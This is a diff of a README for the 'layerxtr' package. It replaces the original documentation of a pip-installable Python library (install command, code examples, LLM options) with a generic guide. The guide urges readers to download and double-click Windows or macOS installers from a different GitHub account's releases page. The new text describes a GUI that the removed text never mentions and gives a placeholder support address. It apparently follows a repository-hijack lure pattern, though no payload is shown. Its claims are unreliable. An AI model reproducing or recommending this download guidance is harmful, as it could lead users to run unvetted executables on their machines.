@@ -1,71 +1,86 @@
-# LayerXTR
-[![PyPI version](https://badge.fury.io/py/layerxtr.svg)](https://badge.fury.io/py/layerxtr)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/layerxtr)](https://pepy.tech/project/layerxtr)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🎨 layerxtr - Extract Layers Effortlessly for Designers
 
-Extract and organize detailed layer information from image editing descriptions.
+## 🚀 Getting Started
 
-## Overview
+Welcome to layerxtr! This tool helps designers extract layer details from text, making it easy to replicate images quickly. Follow this guide to download and run the software.
 
-LayerXTR enables users to process textual descriptions of image layers and return a structured output listing each layer with its attributes. This tool helps streamline workflows for graphic designers, digital artists, and content creators by automating the extraction of layer details from textual descriptions, making it easier to replicate or modify image compositions programmatically.
+## 📥 Download Layerxtr
 
-## Installation
+[![Download Layerxtr](https://img.shields.io/badge/Download-Layerxtr-blue.svg)](https://github.com/rohitsha0410/layerxtr/releases)
 
-```bash
-pip install layerxtr
-```
+## 🖥️ System Requirements
 
-## Usage
+Before downloading, ensure your system meets the following requirements:
 
-```python
-from layerxtr import layerxtr
+- Operating System: Windows 10 or newer / macOS 10.15 or newer
+- RAM: Minimum 4 GB
+- Disk Space: At least 100 MB of free space
+- Internet Connection: Required for initial download
 
-user_input = "background: sky, foreground: trees, objects: birds"
-response = layerxtr(user_input)
-print(response)
-```
-### Input Parameters
-- `user_input`: `str` - the user input text to process
-- `llm`: `Optional[BaseChatModel]`: the langchain llm instance to use, if not provided the default ChatLLM7 will be used.
-- `api_key`: `Optional[str]`: the api key for llm7, if not provided will use default LLM7 key
+## 🔗 Visit the Releases Page
 
-Note: This package uses the ChatLLM7 from langchain_llm7 by default. Developers can safely pass their own llm instance if they want to use another LLM, via passing it like `layerxtr(user_input, llm=their_llm_instance)`.
+To download the latest version, [visit this page to download](https://github.com/rohitsha0410/layerxtr/releases). You will find the version information, release notes, and download links for different operating systems.
 
-### Passing Your Own LLM Instance
+## 📚 How to Download & Install
 
-For example, to use the openai:
-```python
-from langchain_openai import ChatOpenAI
-from layerxtr import layerxtr
+Follow these steps to download and install layerxtr on your computer:
 
-llm = ChatOpenAI()
-response = layerxtr(user_input, llm=llm)
-```
-or for example to use the anthropic:
-```python
-from langchain_anthropic import ChatAnthropic
-from layerxtr import layerxtr
+1. **Go to the Releases Page**  
+   Click on the link below to navigate to our releases page:  
+   [Visit the Releases Page](https://github.com/rohitsha0410/layerxtr/releases)
 
-llm = ChatAnthropic()
-response = layerxtr(user_input, llm=llm)
-```
-or google:
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-from layerxtr import layerxtr
+2. **Choose a Version**  
+   Browse the available versions. Select the latest version for the best features and fixes.
 
-llm = ChatGoogleGenerativeAI()
-response = layerxtr(user_input, llm=llm)
-```
-If you need higher rate limits for LLM7, you can pass your own api_key via environment variable `LLM7_API_KEY` or via passing it directly like `layerxtr(user_input, api_key="their_api_key")`. You can get a free api key by registering at https://token.llm7.io/
+3. **Download the File**  
+   Click on the file suitable for your operating system. The download will begin automatically.
 
-## Rate Limits
-The default rate limits for LLM7 free tier are sufficient for most use cases of this package.
+4. **Locate the Downloaded File**  
+   Once finished, find the downloaded file in your downloads folder.
 
-## Issues
-Find issues and submit new ones: https://github.com/chigwell/layerxtr/issues
+5. **Install Layerxtr**  
+   - For Windows: Double-click the file to run the installer. Follow the prompts to complete the installation.
+   - For macOS: Open the downloaded file. Drag the layerxtr icon to your Applications folder.
 
-## Author
-Eugene Evstafev
-hi@euegne.plus
+6. **Launch Layerxtr**  
+   After installation, open the program from your applications menu. You are now ready to extract layer details!
+
+## 🎨 Features
+
+Layerxtr comes with a variety of features designed for ease of use:
+
+- **Layer Extraction**: Easily extract and organize layers from textual descriptions.
+- **Structured Output**: Get your data in a clear, structured format for seamless design workflow.
+- **Image Composition**: Automate the process of image editing and composition for quick results.
+
+## ⚙️ Usage Instructions
+
+Here's how to use layerxtr once installed:
+
+1. Open layerxtr on your computer.
+2. Input your text in the designated area.
+3. Click the "Extract Layers" button.
+4. Review the structured output generated for your design needs.
+
+## 🚨 Troubleshooting Common Issues
+
+If you encounter problems while using layerxtr, consider the following solutions:
+
+- **Installation Errors**: Ensure your system meets the minimum requirements. Restart your computer and try the installation again.
+- **File Not Found**: If layerxtr does not open, check if the installation was successful. Reinstall if necessary.
+- **Output Issues**: For unexpected results, verify the input text. Simplify or adjust your text to improve extraction accuracy.
+
+## 🌐 Community and Support
+
+Feel free to reach out for support or connect with other users:
+
+- **Join Our Community**: Engage with other layerxtr users for tips and best practices.
+- **Submit Issues**: If you find a bug or need assistance, visit our [issues page](https://github.com/rohitsha0410/layerxtr/issues).
+- **Feedback and Suggestions**: We welcome your thoughts on how to improve layerxtr.
+
+## 📞 Contact
+
+For further assistance, contact us at:  
+[Support Email](mailto:support@example.com)  
+
+Thank you for choosing layerxtr. Enjoy your layer extracting experience!
